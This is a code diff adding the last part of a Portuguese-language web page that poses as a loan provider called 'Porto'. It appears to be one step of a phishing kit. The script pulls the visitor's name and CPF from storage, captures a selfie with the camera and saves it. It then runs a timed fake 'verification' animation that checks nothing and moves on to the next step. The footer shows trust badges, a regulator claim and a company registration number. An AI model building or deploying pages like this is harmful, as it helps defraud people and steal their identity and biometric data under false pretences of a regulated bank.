+    </div>
+  </div>
+
+  <script>
+    function loadUserData() {
+      const nome = localStorage.getItem('nome');
+      if (nome) {
+        const nomes = nome.trim().split(' ');
+        const ultimoNome = nomes.length > 1 ? nomes[nomes.length - 1] : '';
+        document.getElementById('userName').textContent = ultimoNome ? `${nomes[0]} ${ultimoNome}` : nomes[0];
+      }
+      const cpf = localStorage.getItem('cpf');
+      if (cpf) {
+        const cpfLimpo = cpf.replace(/\D/g, '');
+        if (cpfLimpo.length === 11) {
+          document.getElementById('userCpf').textContent = `${cpfLimpo.substring(0,3)}.${cpfLimpo.substring(3,6)}.${cpfLimpo.substring(6,9)}-${cpfLimpo.substring(9,11)}`;
+        }
+      }
+    }
+    document.addEventListener('DOMContentLoaded', loadUserData);
+
+    const btnAgree = document.getElementById('btnAgree');
+    const btnCancel = document.getElementById('btnCancel');
+    const stepConsent = document.getElementById('stepConsent');
+    const stepCamera = document.getElementById('stepCamera');
+    const video = document.getElementById('video');
+    const btnCapture = document.getElementById('btnCapture');
+    const previewArea = document.getElementById('previewArea');
+    const photoImg = document.getElementById('photoImg');
+    const btnUse = document.getElementById('btnUse');
+    const btnRetake = document.getElementById('btnRetake');
+    const btnRetryCam = document.getElementById('btnRetryCam');
+    const btnCamBack = document.getElementById('btnCamBack');
+    const cameraError = document.getElementById('cameraError');
+    const camStatus = document.getElementById('camStatus');
+    const cameraControls = document.getElementById('cameraControls');
+
+    const STATUS_ACTIVE = '<span class="cam-dot"></span> Verificação ativa';
+    const STATUS_DONE = '<svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path></svg> Foto capturada!';
+
+    let stream = null;
+    let capturedDataUrl = null;
+
+    function showStepCamera() {
+      stepConsent.classList.add('hidden');
+      stepCamera.classList.remove('hidden');
+      startCamera();
+    }
+
+    btnAgree.addEventListener('click', () => showStepCamera());
+    btnCancel.addEventListener('click', () => { history.back(); });
+
+    async function startCamera() {
+      cameraError.classList.add('hidden');
+      const constraints = { video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false };
+      try {
+        stream = await navigator.mediaDevices.getUserMedia(constraints);
+        video.srcObject = stream;
+        await video.play();
+      } catch (err) {
+        console.error('camera error', err);
+        cameraError.textContent = 'Não foi possível acessar a câmera. Verifique permissões e tente novamente.';
+        cameraError.classList.remove('hidden');
+      }
+    }
+
+    function stopCamera() {
+      if (stream) {
+        stream.getTracks().forEach(t => t.stop());
+        stream = null;
+      }
+      video.pause();
+      video.srcObject = null;
+    }
+
+    btnCapture.addEventListener('click', () => {
+      if (!stream) {
+        cameraError.textContent = 'Câmera não iniciada.';
+        cameraError.classList.remove('hidden');
+        return;
+      }
+      const w = video.videoWidth;
+      const h = video.videoHeight;
+      const canvas = document.createElement('canvas');
+      canvas.width = w;
+      canvas.height = h;
+      const ctx = canvas.getContext('2d');
+      ctx.translate(w, 0);
+      ctx.scale(-1, 1);
+      ctx.drawImage(video, 0, 0, w, h);
+      capturedDataUrl = canvas.toDataURL('image/jpeg', 0.92);
+
+      photoImg.src = capturedDataUrl;
+      photoImg.classList.remove('hidden');
+      cameraControls.classList.add('hidden');
+      previewArea.classList.remove('hidden');
+      camStatus.innerHTML = STATUS_DONE;
+    });
+
+    function resetCapture() {
+      capturedDataUrl = null;
+      photoImg.src = '';
+      photoImg.classList.add('hidden');
+      previewArea.classList.add('hidden');
+      cameraControls.classList.remove('hidden');
+      camStatus.innerHTML = STATUS_ACTIVE;
+    }
+
+    btnRetake.addEventListener('click', resetCapture);
+
+    btnRetryCam.addEventListener('click', async () => {
+      resetCapture();
+      stopCamera();
+      await startCamera();
+    });
+
+    btnCamBack.addEventListener('click', () => {
+      stopCamera();
+      resetCapture();
+      stepCamera.classList.add('hidden');
+      stepConsent.classList.remove('hidden');
+    });
+
+    btnUse.addEventListener('click', async () => {
+      if (!capturedDataUrl) {
+        alert('Faça a captura antes de prosseguir.');
+        return;
+      }
+
+      try {
+        localStorage.setItem('nbk_captured_photo', capturedDataUrl);
+      } catch (e) {
+        console.warn('Erro ao salvar no localStorage', e);
+      }
+
+      btnUse.disabled = true;
+      btnRetake.disabled = true;
+      stopCamera();
+      runVerification();
+    });
+
+    function runVerification() {
+      const overlay = document.getElementById('verifyOverlay');
+      const validating = document.getElementById('vfValidating');
+      const success = document.getElementById('vfSuccess');
+      const steps = Array.from(validating.querySelectorAll('.vf-step'));
+
+      const setState = (el, state) => {
+        el.classList.remove('pending', 'active', 'done');
+        el.classList.add(state);
+      };
+
+      steps.forEach((s, i) => setState(s, i === 0 ? 'active' : 'pending'));
+      validating.classList.remove('hidden');
+      success.classList.add('hidden');
+      overlay.classList.remove('hidden');
+
+      let i = 0;
+      const timer = setInterval(() => {
+        setState(steps[i], 'done');
+        i++;
+        if (i < steps.length) {
+          setState(steps[i], 'active');
+        } else {
+          clearInterval(timer);
+          setTimeout(() => {
+            validating.classList.add('hidden');
+            success.classList.remove('hidden');
+            setTimeout(() => { var p = new URLSearchParams(window.location.search); window.location.href = '../7/' + (p.toString() ? '?' + p.toString() : ''); }, 1600);
+          }, 500);
+        }
+      }, 950);
+    }
+
+    window.addEventListener('pagehide', () => stopCamera());
+    window.addEventListener('beforeunload', () => stopCamera());
+  </script>
+
+
+
+
+<!-- FOOTER BOM PRA CRÉDITO -->
+<footer class="ss-footer">
+  <div class="ss-footer-logo"><img src="../images/logo.png" alt="Porto"></div>
+  <p class="ss-footer-company">&copy; 2026 Pagamentos S.A &ndash; Instituição de Pagamento.</p>
+  <p class="ss-footer-addr">São Paulo, SP &ndash; CEP 05409-000</p>
+  <div class="ss-footer-links">
+    <a onclick="document.getElementById('ss-termos').showModal();return false;">Termos de Uso</a><span>&bull;</span>
+    <a onclick="document.getElementById('ss-privacidade').showModal();return false;">Política de Privacidade</a><span>&bull;</span>
+    <a onclick="document.getElementById('ss-contato').showModal();return false;">Contato</a>
+  </div>
+  <div class="ss-footer-badges">
+    <span><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>SSL Seguro</span>
+    <span><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>Dados protegidos</span>
+    <span><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 21V5a2 2 0 00-2-2H7a2 2 0 00-2 2v16m14 0h2m-2 0h-5m-9 0H3m2 0h5M9 7h1m-1 4h1m4-4h1m-1 4h1m-5 10v-5a1 1 0 011-1h2a1 1 0 011 1v5m-4 0h4"/></svg>Instituição regulada</span>
+  </div>
+</footer>
+
+<dialog id="ss-termos" class="ss-dialog">
+  <div class="ss-dialog-head"><h2>Termos de Uso</h2><button class="ss-dialog-close" onclick="this.closest('dialog').close()">&times;</button></div>
+  <div class="ss-dialog-body">
+    <h3>1. Aceitação dos Termos</h3>
+    <p>Ao acessar e utilizar os serviços da Porto, você concorda com estes Termos de Uso.</p>
+    <h3>2. Serviços Oferecidos</h3>
+    <p>A Porto é uma instituição financeira digital que oferece serviços de empréstimo pessoal com aprovação rápida e processo 100% online.</p>
+    <h3>3. Elegibilidade</h3>
+    <ul><li>Ser maior de 18 anos</li><li>Possuir CPF válido</li><li>Ter conta bancária ativa em seu nome</li></ul>
+  </div>
+</dialog>
+
+<dialog id="ss-privacidade" class="ss-dialog">
+  <div class="ss-dialog-head"><h2>Política de Privacidade</h2><button class="ss-dialog-close" onclick="this.closest('dialog').close()">&times;</button></div>
+  <div class="ss-dialog-body">
+    <h3>1. Coleta de Dados</h3>
+    <p>A Porto coleta dados pessoais, de contato, financeiros e de navegação.</p>
+    <h3>2. Seus Direitos (LGPD)</h3>
+    <ul><li>Acessar seus dados pessoais</li><li>Corrigir dados incompletos</li><li>Solicitar exclusão de dados</li></ul>
+  </div>
+</dialog>
+
+<dialog id="ss-contato" class="ss-dialog">
+  <div class="ss-dialog-head"><h2>Fale Conosco</h2><button class="ss-dialog-close" onclick="this.closest('dialog').close()">&times;</button></div>
+  <div class="ss-dialog-body">
+    <div class="ss-contact-item"><div class="ss-contact-icon"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24" width="24" height="24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"/></svg></div><div><h4>Email</h4><p>contato@bancoporto.com.br</p></div></div>
+    <div class="ss-contact-item"><div class="ss-contact-icon"><svg fill="currentColor" viewBox="0 0 24 24" width="24" height="24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347z"/></svg></div><div><h4>ParceiroChat</h4><p>(11) 98765-4321</p></div></div>
+    <div class="ss-contact-note"><p><strong>CNPJ:</strong> 30.680.829/0001-43</p><p><strong>Razão Social:</strong> Banco Porto S.A.</p></div>
+  </div>
+</dialog>
+
+<script>
+document.querySelectorAll(".ss-dialog").forEach(function(d){d.addEventListener("click",function(e){if(e.target===d)d.close();});});
+</script>
+</body>
+</html>
+
+
+
+
+
+
+
